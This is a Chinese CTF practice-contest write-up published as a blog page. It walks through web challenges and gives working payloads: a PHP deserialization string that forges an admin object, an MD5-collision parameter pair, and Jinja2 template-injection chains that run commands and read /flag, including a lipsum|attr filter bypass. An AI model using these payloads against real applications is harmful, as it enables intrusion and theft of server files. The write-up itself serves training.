@@ -1,0 +1,425 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="generator" content="Hexo 7.3.0"><meta name="theme" content="hexo-theme-yun"><title>203周末练习赛25/3/15 | Hexo</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"example.com","root":"/","title":["Sec203Team"],"version":"1.10.11","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml"><meta name="description" content="webpopp 首先，看代码的三个类：Logger、User、Request。还有一个反序列化的入口，通过GET参数data传入，反序列化后的对象会被检查是否存在user属性，并且user的is_admin是否为真，如果是的话就执行系统命令输出flag。 目标是通过构造一个反序列化的payload，使得$data-&gt;user-&gt;is_admin为真，进而执行system(“cat &amp;#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="203周末练习赛25&#x2F;3&#x2F;15">
+<meta property="og:url" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="webpopp 首先，看代码的三个类：Logger、User、Request。还有一个反序列化的入口，通过GET参数data传入，反序列化后的对象会被检查是否存在user属性，并且user的is_admin是否为真，如果是的话就执行系统命令输出flag。 目标是通过构造一个反序列化的payload，使得$data-&gt;user-&gt;is_admin为真，进而执行system(“cat &amp;#">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742214012778-2b26baa3-0680-45ee-b4c4-1e56295f0bb1.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742214012913-381db322-3f37-4586-9ddc-3d1bd49f8a4a.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742214012915-d51dfadd-f183-485f-bcc4-db3d155030d0.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742214012859-5a0a0b8e-8d95-40e7-9ec1-f1f86a1c70d7.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742214012999-4a47e650-5345-4140-b95a-756381babef8.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742214013202-3e9ed5a9-3ef2-4f0d-957c-7a056b409d26.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742215433487-8f7e929f-61af-4b4e-bdf4-a2d1b1613f16.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742215433571-32971e2f-eef8-4100-ab89-a9afe2813dc0.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742215434718-4f08db6e-a3d5-4b0d-8e62-85d343a55960.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742215524802-cf166538-ae41-44aa-9c66-720540b1da76.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742215524941-c0431a0e-11bd-40ad-8c3b-37cf0000bcd8.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742215524910-02259e55-58ae-45e3-beac-442459aea2d5.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742215524884-83152f36-50e9-490a-a149-f37f7fdd902d.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742213856538-c2554eb0-0e85-4051-bfb5-405ad3d27ccb.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742213856714-df557a52-c122-46c7-b766-97454aace05f.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742213856881-7ce3dfdf-030e-4555-ac87-fff799449f05.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742432622314-51237bc8-539d-4601-8f3c-d70eb103beeb.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742432622742-3837972d-40e5-4c01-be0e-da97b0a5fd3c.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742432622542-ee43df7c-9244-4ae0-af4b-2665650fbe91.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742432622430-d405715b-5ee2-4ada-9d47-07546b591bd3.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742432622326-ce366b3d-f1eb-44d3-bd78-d2e970a7c83c.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742432622652-686473ec-518e-4206-80d2-56da9e60f476.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742432622949-fa6397bc-3b96-4203-9298-a04ae5752b14.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742218143835-307c11be-910d-413f-a098-a565750bf302.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742216259988-3289932e-31a1-433b-84bf-f96ec08b3afb.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742216257996-a6b7c04b-bebf-42c3-81c1-a5c6e782aafa.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742216257899-6a554337-ed1b-4fe9-a09e-19b8596bd410.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742216262574-5ad751d3-5474-4e77-bd6f-ac2d2a74c8a6.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742216258466-ac512520-092c-4f18-b39c-88486bfeaf66.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742216167911-6d2414ee-bb40-4422-bb53-0fab767fc5b4.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742216168583-36629c57-bd42-484e-839b-1e31e5be821f.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742216168217-27361280-7ef0-463e-8d90-1a2f9da41d62.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742216168882-5537668e-1ca9-4cf1-a04f-1410787d94f2.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742216168501-1154afea-3fa8-4eda-a024-d1c226a382ae.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742216168682-2e311c92-c516-44fd-99cb-a7d9e7d34b2c.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742216168712-d5fe30ad-79c4-4e09-af5b-40824a054969.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742216169019-9ea5e128-3975-4559-915e-fe0a5fe848fa.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742216169114-b604d976-9f81-40af-a7a7-c9158a22ce25.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742216169010-a0c97218-70c2-423d-8779-cfcb68b18962.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742216169934-3515d179-41db-4a7c-a175-0686c5deae4a.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742216169343-72c8c091-6a65-41b8-a677-a4742f7659c7.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742216169651-4a8e7cc3-1fd7-4487-aa4e-5face3984f32.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742215632828-13d0bcfd-3cfc-4ea6-b3d0-4bff36539aba.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742215633081-35de9eea-2cb9-4c27-a7a5-1a5764f5b3fc.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742215633167-73e53de2-00ce-4368-a13f-573307f1663c.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742216527574-c99f6391-8fc2-4b98-bae1-81af1ad1dea5.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742216527491-5761d125-2d2b-4218-895a-d77159c5d945.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742216450602-52b463c8-6f96-482a-a23f-a48960da8db8.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742216450529-e6a04f45-5e90-4ea1-b2c6-f07d33605cc7.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742216450787-67b37d63-f032-41c9-a237-17a911b43772.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742216450671-a79badd5-87d1-4713-bc27-fde9d3dd5881.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742216450742-15dd276e-2a1c-4d63-ad61-c2ecfaa1ff1a.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742216450761-05e5c53c-b14f-4056-b16c-58d94301a170.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742217612034-c65adedc-524a-42ad-bb49-5efa3ea89af3.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742217612633-62d2e390-e3c7-43b8-a6a8-685be3a6b7e8.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742217612161-eb759c11-9a4c-4116-b9af-19ed18ab5b4a.png">
+<meta property="og:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742217611782-a8b86d89-2f24-458d-a6df-e12511a0d3b7.png">
+<meta property="article:published_time" content="2025-03-15T13:00:00.000Z">
+<meta property="article:modified_time" content="2025-03-20T04:12:09.826Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="203练习赛">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/article/2025/03/2025.3.15-practice-wp.html/1742214012778-2b26baa3-0680-45ee-b4c4-1e56295f0bb1.png"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="John Doe"><img width="96" loading="lazy" src="/images/a8c5d524d3ada684930a703b4725d87e.png" alt="John Doe"><span class="site-author-status" title="不想上学">💨</span></a><div class="site-author-name"><a href="/about/">John Doe</a></div><span class="site-name">Hexo</span><sub class="site-subtitle"></sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">4</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">1</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">4</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#popp"><span class="toc-number">1.1.</span> <span class="toc-text">popp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#readfile"><span class="toc-number">1.2.</span> <span class="toc-text">readfile</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-ssti"><span class="toc-number">1.3.</span> <span class="toc-text">ez_ssti</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sstiPro"><span class="toc-number">1.4.</span> <span class="toc-text">sstiPro</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#readfile-1"><span class="toc-number">1.5.</span> <span class="toc-text">readfile</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xxx"><span class="toc-number">1.6.</span> <span class="toc-text">(&gt;!xxx!&lt;)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#misc"><span class="toc-number">2.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%80%8A%E5%A3%B0%E9%9F%B3%E8%BF%B7%E5%AE%AB%E3%80%8B"><span class="toc-number">2.1.</span> <span class="toc-text">《声音迷宫》</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%97%E6%A2%A6%E7%A9%BA%E9%97%B4"><span class="toc-number">2.2.</span> <span class="toc-text">盗梦空间</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%80%8A%E5%B0%8F%E9%BB%91%E5%AD%90%E9%9C%B2%E5%87%BA%E9%B8%A1%E8%84%9A%E4%BA%86%E5%90%A7%E3%80%8B"><span class="toc-number">2.3.</span> <span class="toc-text">《小黑子露出鸡脚了吧》</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%AA%E6%98%8E%E4%BA%BA"><span class="toc-number">2.4.</span> <span class="toc-text">聪明人</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#reverse"><span class="toc-number">3.</span> <span class="toc-text">reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#xxtea"><span class="toc-number">3.1.</span> <span class="toc-text">xxtea</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E8%84%B1%E5%A3%B3"><span class="toc-number">3.2.</span> <span class="toc-text">常规脱壳</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OSINT"><span class="toc-number">4.</span> <span class="toc-text">OSINT</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%80%8AInstagram%E5%9C%B0%E7%90%86%E7%8C%8E%E4%BA%BA%E3%80%8B"><span class="toc-number">4.1.</span> <span class="toc-text">《Instagram地理猎人》</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://example.com/article/2025/03/2025.3.15-practice-wp.html/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="John Doe"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Hexo"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">203周末练习赛25/3/15</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2025-03-15 21:00:00" itemprop="dateCreated datePublished" datetime="2025-03-15T21:00:00+08:00">2025-03-15</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2025-03-20 12:12:09" itemprop="dateModified" datetime="2025-03-20T12:12:09+08:00">2025-03-20</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Sec203Team/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Sec203Team</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/web/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">web</span></a><a class="tag-item" href="/tags/CTF/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">CTF</span></a><a class="tag-item" href="/tags/203%E7%BB%83%E4%B9%A0%E8%B5%9B/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">203练习赛</span></a></span></div><div class="post-author"><span class="author-name">ZeroTrace, All</span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="popp"><a href="#popp" class="headerlink" title="popp"></a>popp</h2><p><img src="1742214012778-2b26baa3-0680-45ee-b4c4-1e56295f0bb1.png" loading="lazy"></p>
+<p>首先，看代码的三个类：Logger、User、Request。还有一个反序列化的入口，通过GET参数data传入，反序列化后的对象会被检查是否存在user属性，并且user的is_admin是否为真，如果是的话就执行系统命令输出flag。</p>
+<p>目标是通过构造一个反序列化的payload，使得$data-&gt;user-&gt;is_admin为真，进而执行system(“cat &#x2F;flag”)。</p>
+<p>首先，分析各个类的魔术方法：</p>
+<p><font style="color:#3370ff;">1.</font><font style="color:#3370ff;">       </font><strong>Logger****类</strong>有一个__destruct方法，在对象销毁时会调用file_put_contents，将内容写入$logFile指定的文件。这里可能需要利用这个方法来触发其他操作，但暂时没想到怎么关联到User的is_admin属性。</p>
+<p><font style="color:#3370ff;">2.</font><font style="color:#3370ff;">       </font><strong>User****类</strong>有一个__wakeup方法，在反序列化时会检查username是否为”admin”，如果是就将is_admin设为1。但是is_admin属性在User类中并没有定义，PHP在这种情况下会动态创建public属性is_admin。所以如果能控制User对象的username为”admin”，那么在反序列化时触发__wakeup后，is_admin会被设为1。</p>
+<p><font style="color:#3370ff;">3.</font><font style="color:#3370ff;">       </font><strong>Request****类</strong>有一个__call魔术方法，当调用不存在的方法时触发，这里会调用call_user_func，参数是$this-&gt;handler和$name。如果能够控制$this-&gt;handler，可能可以执行任意函数。</p>
+<p>**1. **</p>
+<p>通过反序列化控制$data-&gt;user-&gt;is_admin为1，触发system(“cat &#x2F;flag”)。</p>
+<p>User::__wakeup()会在反序列化时检查username &#x3D;&#x3D;&#x3D; “admin”，若成立则动态设置is_admin &#x3D; 1。</p>
+<p>需构造User对象，使其username属性为”admin”。</p>
+<p>在网上找的参考代码</p>
+<p><img src="1742214012913-381db322-3f37-4586-9ddc-3d1bd49f8a4a.png" loading="lazy"></p>
+<p>*<em>2. <strong><strong>构造</strong></strong>Payload</em>*</p>
+<p>通过直接控制User对象的属性满足条件：</p>
+<p><img src="1742214012915-d51dfadd-f183-485f-bcc4-db3d155030d0.png" loading="lazy"></p>
+<p>O%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A4%3A%22user%22%3BO%3A4%3A%22User%22%3A1%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%22admin%22%3B%7D%7D</p>
+<p>**3. **<strong>利用链验证</strong></p>
+<p><font style="color:#3370ff;">•</font><font style="color:#3370ff;">          </font><strong>反序列化流程</strong>：</p>
+<p><font style="color:#3370ff;">a.</font><font style="color:#3370ff;">       </font>反序列化stdClass对象，其user属性指向User对象。</p>
+<p><font style="color:#3370ff;">b.</font><font style="color:#3370ff;">      </font>User::__wakeup()触发，因username为”admin”，动态设置is_admin &#x3D; 1。</p>
+<p><font style="color:#3370ff;">c.</font><font style="color:#3370ff;">       </font>条件$data-&gt;user-&gt;is_admin为真，执行system(“cat       &#x2F;flag”)。</p>
+<p>stdClass是PHP的一个基类，几乎所有的类都继承这个类，任何时候都可以被new，可以让一个变量成为一个对象（object）。</p>
+<p>*<em>4. <strong><strong>完整</strong></strong>Payload</em>*</p>
+<p>将生成的序列化字符串作为data参数传递：?data&#x3D; O%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A4%3A%22user%22%3BO%3A4%3A%22User%22%3A1%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%22admin%22%3B%7D%7D</p>
+<h2 id="readfile"><a href="#readfile" class="headerlink" title="readfile"></a>readfile</h2><p><img src="1742214012859-5a0a0b8e-8d95-40e7-9ec1-f1f86a1c70d7.png" loading="lazy"></p>
+<p>3</p>
+<table>
+<thead>
+<tr>
+<th><font style="color:#646a73;">PHP   </font><font style="color:black;">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</font></th>
+</tr>
+</thead>
+</table>
+<p><img src="1742214012999-4a47e650-5345-4140-b95a-756381babef8.png" loading="lazy"></p>
+<p><img src="1742214013202-3e9ed5a9-3ef2-4f0d-957c-7a056b409d26.png" loading="lazy"></p>
+<hr>
+<h2 id="ez-ssti"><a href="#ez-ssti" class="headerlink" title="ez_ssti"></a>ez_ssti</h2><p>第一种</p>
+<p>首先进行测试查看ssti模板注入的引擎类型</p>
+49       # Jinja2/Twig返回49  
+<p>${7<em>7}        # Freemarker返回49<br>#{7</em>7}        # Velocity返回49<br>&lt;%&#x3D; 7*7 %&gt;    # ERB（Ruby）返回49</p>
+<p><img src="1742215433487-8f7e929f-61af-4b4e-bdf4-a2d1b1613f16.png" loading="lazy"></p>
+<p>确定引擎类型后</p>
+<p><strong>获取基类</strong>：通过字符串对象的继承链找到基类（如<font style="color:black;background-color:#eff0f1;">object</font>）</p>
+<pre><code class="language-python">&#123;&#123; ''.__class__.__mro__[1] &#125;&#125;  # 输出 &lt;class &#39;object&#39;&gt;
+</code></pre>
+<p><img src="1742215433571-32971e2f-eef8-4100-ab89-a9afe2813dc0.png" loading="lazy"></p>
+<p><strong>遍历子类</strong>：查找包含危险方法的子类（如<font style="color:black;background-color:#eff0f1;">os._wrap_close</font>）</p>
+<pre><code class="language-python">&#123;&#123; ''.__class__.__mro__[1].__subclasses__() &#125;&#125;
+</code></pre>
+<p><img src="1742215434718-4f08db6e-a3d5-4b0d-8e62-85d343a55960.png" loading="lazy"></p>
+<p><strong>访问</strong><font style="color:black;background-color:#eff0f1;"><strong>os</strong></font><strong>模块</strong>：通过子类的<font style="color:black;background-color:#eff0f1;"><strong>init</strong>.<strong>globals</strong></font>获取<font style="color:black;background-color:#eff0f1;">os</font>模块。</p>
+<pre><code class="language-python">&#123;&#123; 
+  ''.__class__.__mro__[1]
+  .__subclasses__()[X]        # X为os._wrap_close的索引
+  .__init__.__globals__['os']
+  .popen('id').read()
+&#125;&#125;
+</code></pre>
+<p>第二种直接输入</p>
+<pre><code class="language-python">&#123;&#123; ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__'].open('/flag').read() &#125;&#125;
+</code></pre>
+<h2 id="sstiPro"><a href="#sstiPro" class="headerlink" title="sstiPro"></a>sstiPro</h2><p>打开环境</p>
+<p><img src="1742215524802-cf166538-ae41-44aa-9c66-720540b1da76.png" loading="lazy"></p>
+<p>有附件打开查看一下发现存在许多过滤</p>
+<p>思考如何绕过</p>
+<p><img src="1742215524941-c0431a0e-11bd-40ad-8c3b-37cf0000bcd8.png" loading="lazy"></p>
+<p><img src="1742215524910-02259e55-58ae-45e3-beac-442459aea2d5.png" loading="lazy"></p>
+<p>**1. ****<font style="color:black;background-color:#bbbfc4;">lipsum</font>**<strong>方法</strong></p>
+<p><font style="color:black;background-color:#bbbfc4;">jinja2</font></p>
+<pre><code>lipsum
+</code></pre>
+<p><font style="color:black;background-color:#bbbfc4;">lipsum</font>是一个在 Jinja2 环境中可能存在的变量。通常，在 Jinja2 中，如果攻击者能够控制模板输入，就可以利用环境中已有的变量来展开攻击。这里假设<font style="color:black;background-color:#bbbfc4;">lipsum</font>是一个可以访问到<font style="color:black;background-color:#bbbfc4;">globals</font>属性的对象。</p>
+<p>**2.Jinja2 <strong><strong>模板引擎的</strong></strong><font style="color:black;background-color:#eff0f1;">attr</font>**<strong>过滤器</strong></p>
+<p>在 Jinja2 模板引擎中，<font style="color:black;background-color:#bbbfc4;">attr</font>是一个过滤器，它的作用是访问对象的属性或者方法。其语法格式为<font style="color:black;background-color:#bbbfc4;">对象</font><font style="color:black;background-color:#bbbfc4;">|attr(“</font><font style="color:black;background-color:#bbbfc4;">属性名或方法名</font><font style="color:black;background-color:#bbbfc4;">“)</font>。</p>
+<p><strong>3.****<font style="color:black;background-color:#eff0f1;">attr(“<strong>globals</strong>“)</font></strong></p>
+<p><font style="color:black;background-color:#bbbfc4;">jinja2</font></p>
+<pre><code class="language-python">lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)
+</code></pre>
+<p><font style="color:black;background-color:#bbbfc4;">attr</font>是 Jinja2 中的一个过滤器，用于访问对象的属性。<font style="color:black;background-color:#bbbfc4;">globals</font>是 Python 中函数或方法对象的一个特殊属性，它指向定义该函数或方法的全局命名空间。通过这个操作，代码尝试获取<font style="color:black;background-color:#bbbfc4;">lipsum</font>对象所在的全局命名空间。</p>
